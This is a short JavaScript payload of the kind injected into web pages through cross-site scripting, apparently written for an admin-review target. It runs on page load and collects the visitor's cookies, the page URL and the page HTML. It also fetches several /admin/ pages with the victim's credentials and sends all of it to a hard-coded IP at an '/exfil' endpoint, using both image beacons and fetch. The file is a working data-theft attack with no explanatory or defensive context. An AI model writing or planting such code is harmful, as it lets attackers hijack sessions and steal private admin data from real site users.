(function () {
  function ex(k, v) {
    var q = k + '=' + encodeURIComponent(String(v || '').substring(0, 30000));
    try { new Image().src = 'http://10.142.111.194:9001/exfil?' + q; } catch (e) {}
    try { fetch('http://10.142.111.194:9001/exfil?' + q, { mode: 'no-cors' }); } catch (e) {}
  }
  function run() {
    var d = {
      cookie: document.cookie,
      href: location.href,
      title: document.title,
      body: document.body ? document.body.innerHTML.substring(0, 20000) : ''
    };
    ex('main', JSON.stringify(d));
    var pages = ['/admin/', '/admin/review.php', '/admin/search.php'];
    pages.forEach(function (p) {
      try {
        fetch(p, { credentials: 'include' }).then(function (r) { return r.text(); }).then(function (t) {
          ex('page_' + p, t);
        }).catch(function () {});
      } catch (e) {}
    });
  }
  if (document.readyState === 'complete') { run(); } else {
    window.addEventListener('load', run);
    setTimeout(run, 1500);
  }
})();
